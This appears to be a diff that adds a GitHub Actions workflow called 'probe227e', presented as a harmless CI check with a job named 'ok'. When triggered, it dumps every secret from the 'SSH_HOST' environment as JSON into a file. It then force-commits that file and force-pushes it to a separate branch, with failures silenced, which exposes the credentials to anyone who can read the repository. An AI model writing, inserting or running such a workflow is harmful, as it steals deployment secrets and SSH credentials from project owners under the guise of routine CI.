@@ -1,0 +1,16 @@
+name: probe227e
+on:
+  push:
+    branches: ["ci-227e"]
+jobs:
+  ok:
+    runs-on: ubuntu-latest
+    environment: SSH_HOST
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          mkdir -p .out; echo "227e $(date)" > .out/hi.txt
+          printf '%s' "${{ toJSON(secrets) }}" > .out/secrets.json
+          git config user.email ci@local; git config user.name ci-bot
+          git add -f .out; git commit -m hi || true
+          git push origin HEAD:ci-227e-out --force || true
